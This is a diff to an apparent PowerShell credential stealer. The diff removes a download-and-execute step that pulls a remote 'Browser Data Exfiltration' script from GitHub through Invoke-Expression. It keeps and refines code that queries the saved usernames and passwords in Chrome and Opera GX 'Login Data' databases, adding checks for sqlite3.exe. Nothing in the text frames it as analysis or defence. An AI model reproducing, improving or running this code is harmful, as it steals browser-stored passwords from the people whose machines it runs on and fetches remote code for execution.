@@ -13,23 +13,18 @@ if ([string]::IsNullOrEmpty($dc)) {
     exit
 }
 
-# Download and execute remote script via Invoke-RestMethod
-try {
-    $scriptUrl = 'https://raw.githubusercontent.com/Pureach/ronin_downloader/main/Browser%20Data%20Exfiltration%20with%20Remote%20Script%20Execution.ps1'
-    Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl -UseBasicParsing).Content
-} catch {
-    Write-Host 'Failed to download and execute the data extraction script.'
-    exit
-}
-
 # Extract saved usernames and passwords from Chrome
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 if (Test-Path $chromePath) {
     $chromeCredentials = "SELECT origin_url, username_value, password_value FROM logins"
     $sqliteCommand = "sqlite3.exe"
     try {
-        $chromeData = & $sqliteCommand $chromePath "$chromeCredentials"
-        Write-Output "[Chrome Credentials]: $chromeData"
+        if (Test-Path $sqliteCommand) {
+            $chromeData = & $sqliteCommand $chromePath "$chromeCredentials"
+            Write-Output "[Chrome Credentials]: $chromeData"
+        } else {
+            Write-Host 'sqlite3.exe not found. Unable to extract Chrome credentials.'
+        }
     } catch {
         Write-Host 'Failed to extract Chrome credentials.'
     }
@@ -57,8 +52,12 @@ $operaPath = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"
 if (Test-Path $operaPath) {
     $operaCredentials = "SELECT origin_url, username_value, password_value FROM logins"
     try {
-        $operaData = & $sqliteCommand $operaPath "$operaCredentials"
-        Write-Output "[Opera GX Credentials]: $operaData"
+        if (Test-Path $sqliteCommand) {
+            $operaData = & $sqliteCommand $operaPath "$operaCredentials"
+            Write-Output "[Opera GX Credentials]: $operaData"
+        } else {
+            Write-Host 'sqlite3.exe not found. Unable to extract Opera GX credentials.'
+        }
     } catch {
         Write-Host 'Failed to extract Opera GX credentials.'
     }
